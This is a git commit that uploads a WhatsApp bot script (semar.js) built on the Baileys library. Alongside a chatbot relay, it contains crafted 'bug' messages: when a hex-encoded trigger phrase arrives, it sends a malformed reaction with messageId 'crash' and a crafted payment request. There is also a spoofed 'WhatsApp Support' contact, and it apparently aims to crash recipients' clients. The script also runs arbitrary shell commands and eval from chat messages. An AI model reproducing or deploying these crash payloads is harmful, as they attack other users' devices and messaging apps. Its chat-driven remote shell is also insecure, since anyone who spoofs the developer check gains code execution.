6e64c9fea57ad025053db2942a88ee2aec26466e
rasitechbot310 <81545629+rasitechbot310@users.noreply.github.com>
2023-01-03 11:09:26 +0700

    Add files via upload

---
+++ semar.js
@@ -0,0 +1,112 @@
+const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
+const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
+const http = require("http");
+const { exec } = require('child_process')
+const cheerio = require('cheerio')
+const moment = require('moment-timezone')
+const util = require('util')
+const axios = require('axios').default
+const fs = require('fs')
+autobug = true
+mode = true
+
+let user = JSON.parse(fs.readFileSync('./user.json'));
+
+module.exports = async (semar, denz, msg) => {
+try {
+if (msg.key && msg.key.remoteJid === 'status@broadcast') return
+const type = getContentType(msg.message)
+const content = JSON.stringify(msg.message)
+const from = msg.key.remoteJid
+const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
+const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
+const isCmd = body.startsWith(prefix)
+const time = moment.tz('Asia/Jakarta').format('ha z')
+const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+const args = body.trim().split(/ +/).slice(1)
+const dn = args.join(' ')
+const isGroup = from.endsWith('@g.us')
+const botNumber = semar.user.id.split(':')[0]
+const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
+const senderNumber = sender.split('@')[0]
+const pushname = msg.pushName || `${senderNumber}`
+const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
+const groupName = isGroup ? groupMetadata.subject : ''
+const groupId = isGroup ? groupMetadata.id : ''
+const groupMembers = isGroup ? groupMetadata.participants : ''
+const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
+const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
+const isGroupAdmins = groupAdmins.includes(sender) || false
+const isSaya = botNumber.includes(senderNumber)
+const isDev = nomorDeveloper.includes(senderNumber) || isSaya
+const isUser = user.includes(from)
+const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
+const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
+const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
+const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
+const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}
+
+const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
+const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
+semar.sendMessage(id, buttonMessage, options)}
+
+const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
+const templateMessage = {text: text1,footer: footer1,templateButtons: but}
+semar.sendMessage(id, templateMessage, options)}
+
+const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
+const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
+semar.sendMessage(id, listMessage, options)}
+
+
+
+if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
+semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
+semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}
+
+
+
+   
+    if (body && !msg.key.fromMe) {
+    //   if (!usr) {
+    //     semar.sendMessage(from, {
+    //       text: "Created By RasiTech\n\nJoin Telegram @RasiTechChannel1",
+    //     });
+    //     usr_.push(from);
+    //   }
+
+    axios
+      .get(`https://api.akuari.my.id/simi/simi?query=${encodeURIComponent(body)}&lc=id`)
+        .then((data) =>
+        reply(`*${JSON.parse(JSON.stringify(data.data)).respon.replace("\n", "").trim()}*`)
+      );
+    //   const simi = fetchJson();
+
+      
+    }
+
+if (command && !isUser) {}
+
+if (body.startsWith(`$`)){ if (!isDev) return
+let evl = body.split("\n")
+let exc = body.replace(evl[0]+"\n", "")
+exec(exc, (err, stdout, stderr) => {
+if (stdout) return reply(`${stdout}`)
+if (stderr) return reply(`${stderr}`)
+if (err) return reply(`${err}`)})}
+        
+if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
+try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
+return reply(require('util').format(evaluate))} catch(e){
+return reply(require('util').format(e))}}
+
+
+if (command) { await semar.readMessages([msg.key]) }
+if (!mode) { if (!isDev) return }
+switch (command) {
+default:
+}} catch (e) {
+console.log(e)
+semar.sendMessage("6285719821928@s.whatsapp.net", {text:e})}}
